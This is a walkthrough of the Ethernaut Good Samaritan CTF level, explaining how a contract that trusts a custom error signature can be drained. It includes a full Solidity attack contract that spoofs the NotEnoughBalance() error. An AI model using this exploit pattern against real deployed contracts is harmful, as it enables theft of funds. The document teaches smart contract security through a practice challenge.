# Ethernaut Level 28 (Good Samaritan) Walkthrough

The following is a semantic solution walkthrough of the Ethernaut CTF level 28. The aim is to give a readable explanation of the concepts involved, and present a step-by-step walkthrough of the solution. In addition, tangential explanations will also be given where essential.

The lesson here is to be careful when using custom errors. Their signature can be computed just like that of a function, and thus relying on their signature for critical logic should be discouraged.

The goal here is simple, exploit the custom error `NotEnoughBalance()` in the contract, and transfer all the funds.

```
    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
```

The target contract's requestDonation() function gives out 10 tokens to the msg.sender. However, if this transfer fails with an error whose signature hash is equal to the signature hash of the custom error NotEnoughBalance(), the function sends all the remaining tokens held by the contract to the msg.sender.

#### Solution

1.  Deploy the attack contract containing the function through which we will make the call to `requestDonation`, the spoof custom error, and an implementation of `notify()` that reverts with this custom error.

```
contract Attack {
    // Custom error
    error NotEnoughBalance();

    constructor() payable{}

    function attack() public {
        (bool success, bytes memory data) = address(0x232c12938CDd7c29873E145330f7FD525BA04d93).call(
            abi.encodeWithSignature("requestDonation()")
        );
        require(success);
    }
    
    function notify(uint256 amount) external pure {
        // Revert with a custom error
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
```

2.  Call attack() and all the funds will be transferred to the Attack contract.

The target contract relied on a custom error for critical logic. We spoofed that custom error and thus exploited the vulnerability, draining the contract for all of its tokens.
